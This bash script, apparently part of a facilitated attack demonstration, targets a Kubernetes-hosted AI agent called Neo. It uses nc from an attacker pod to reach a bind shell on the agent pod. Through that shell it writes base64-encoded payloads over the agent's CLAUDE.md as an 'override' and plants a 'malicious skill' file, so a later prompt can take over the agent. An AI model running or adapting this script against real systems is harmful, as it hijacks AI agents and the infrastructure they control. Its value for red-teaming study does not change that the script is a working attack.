#!/usr/bin/env bash
# Connect to the bind shell on the agent pod and inject takeover payloads.
# Runs from the facilitator's laptop, piping commands through oc exec on the attacker pod.
set -euo pipefail

ATTACK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$ATTACK_DIR/../config.sh"

PAYLOADS_DIR="$ATTACK_DIR/payloads"
BIND_PORT="${BIND_PORT:-4444}"
ATTACKER_NS="${ATTACKER_NS:-attacker}"
AGENT_HOME="/opt/app-root/src"

echo "============================================================"
echo " Neo | Attacker — Connect & Takeover"
echo "============================================================"
echo ""

echo "── Resolving agent pod IP ──"
AGENT_IP=$(oc get pod -l app.kubernetes.io/name=neo -n "$NAMESPACE" \
  -o jsonpath='{.items[0].status.podIP}')
echo "  Agent IP: $AGENT_IP"

if [[ -z "$AGENT_IP" ]]; then
  echo "ERROR: Could not resolve agent pod IP in namespace $NAMESPACE"
  exit 1
fi

CLAUDE_MD_B64=$(base64 < "$PAYLOADS_DIR/claude-md-override.txt" | tr -d '\n')
SKILL_K8S_B64=$(base64 < "$PAYLOADS_DIR/skill-k8s-ops.txt" | tr -d '\n')

echo ""
echo "── Connecting to bind shell at $AGENT_IP:$BIND_PORT ──"
echo "── Injecting CLAUDE.md override + malicious skill ──"
echo ""

# Build the command script — uses base64 to avoid heredoc/quoting issues in the pipe
SCRIPT=$(cat <<SCRIPT_EOF
echo ${CLAUDE_MD_B64} | base64 -d > ${AGENT_HOME}/.claude/CLAUDE.md
mkdir -p ${AGENT_HOME}/.claude/skills
echo ${SKILL_K8S_B64} | base64 -d > ${AGENT_HOME}/.claude/skills/k8s-ops.md
echo TAKEOVER_COMPLETE
exit
SCRIPT_EOF
)

# Encode the full script as base64 and pipe through nc on the attacker pod
SCRIPT_B64=$(printf '%s\n' "$SCRIPT" | base64 | tr -d '\n')

oc exec attacker -n "$ATTACKER_NS" -c attacker -- sh -c \
  "echo '$SCRIPT_B64' | base64 -d | nc '$AGENT_IP' '$BIND_PORT'"

echo ""
echo "Takeover payloads injected."
echo ""
echo "Next: trigger exploitation prompt via the UI or auto-attack.sh"
